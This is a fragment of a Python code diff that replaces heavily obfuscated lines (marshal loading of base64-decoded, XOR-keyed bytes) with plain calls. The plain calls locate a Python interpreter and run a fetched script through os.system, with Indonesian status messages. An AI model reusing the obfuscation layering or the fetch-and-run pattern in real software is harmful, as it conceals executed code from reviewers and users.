__import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('1+n0zqFJkb5M47aBryt/ZEWk+ZLsGt+0TbW0mfo3ajAf9bGQ'), bytes.fromhex('2dcb97a1cc24f0d028c39bf78f5b0610'))))()) == 0:
-        py = (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('sYm4hzAevevy'), bytes.fromhex('4b8ec8fe4476d285c1d6be15f8947c13'))))()
-    elif getattr(os, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('LnKsgIZZLO5o'), bytes.fromhex('f475c1e1f42a448f04e45761545e1870'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('x671MNU5xY8='), bytes.fromhex('1da89751a65cf3bb4af505f5e71069e7'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('o8yD1NHxpM5DI4G/LIo='), bytes.fromhex('59c0b4be9da2dd803747b48961b7a752'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('f6SdNUjBFZp/SRuthXmslObhl2QaxULILhxP8Y5wosDjvQ=='), bytes.fromhex('8584ae017bf574ab1d787a95b74094a6'))))()))))())((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('R/Oa3UzO4B2hX1bQywrqMdW9l5IfjOUWs1AV04cWs3eD9Mg='), bytes.fromhex('bdd2f9b221a38173c57f7ba6eb7a9345'))))()) == 0:
-        py = (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('1qEtSu4HVBI='), bytes.fromhex('2ca75d339a6f3b7c3758e5a81e83ae50'))))()
+
+    if os.system('command -v python3 >/dev/null 2>&1') == 0:
+        py = 'python3'
+    elif os.system('command -v python >/dev/null 2>&1') == 0:
+        py = 'python'
     else:
-        print((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('ScBqrrHJvBAmWqQ/0yPyB+yYHsbeRQHob3uXBrwVoVPZjB/F0EU='), bytes.fromhex('bce16aaeb12b219c061ff66d9c71c827'))))())
-        getattr(sys, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('i4j7Ioxe62lU'), bytes.fromhex('518f9643fe2d8308381a3a2c6f24fe4a'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('eKsJnR9Xhu4='), bytes.fromhex('a2ad6bfc6c32b0da7c7e489b6fdd72b9'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Fe6PoZGoTdJ+2Q=='), bytes.fromhex('efe6e7f6e1e9008546baffccaed96df1'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('PwreUcPhcfVj/mrWLIEpBKRPiQOWsXGkYPNo0CLcJ1bzEg=='), bytes.fromhex('c52aeb37f58443c057c75ae01ab91e35'))))()))))())(1)
-    getattr(os, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('glUN3+PRHJ8E'), bytes.fromhex('585260be91a274fe6816aca0f9654f24'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('uhxoYb4q3Ps='), bytes.fromhex('601a0a00cd4feacfa50634f6cf8d4e27'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('DhGGKZFDFegALUESZfc='), bytes.fromhex('f41df063c412508a7174162051ca67b9'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('ZkFuYSM7lOsF/wx1WhUye6xSbmYvbcS9APIMfF5GY3j5Ag=='), bytes.fromhex('9c6158571a08a2d833c76f4c3f76011e'))))()))))())(f'{py} "{script_path}"')
+        print("❌ ERROR: Python tidak ditemukan")
+        sys.exit(1)
+
+    os.system(f'{py} "{script_path}"')
+
 
 def main():
-    print((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('1+v9DQKLWu6Re1tOxvCmn1+uwBxAwVbtmHpeD9ylu5tKspBZQdQb75V7WVuS+Q=='), bytes.fromhex('2dc7b0686ce13b82f015302fa8d0d5fc'))))())
+    print("Menjalankan script, mohon tunggu 1-5 menit:)")
     fetch_script()
     run_script()
-if __name__ == (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('ml5Ya4mBqsedYQ=='), bytes.fromhex('60560734e4e0c3a9c23eee4fe1d59aa4'))))():
-    main()
 
-# You God God God God God God
+
+if __name__ == '__main__':
+    main()
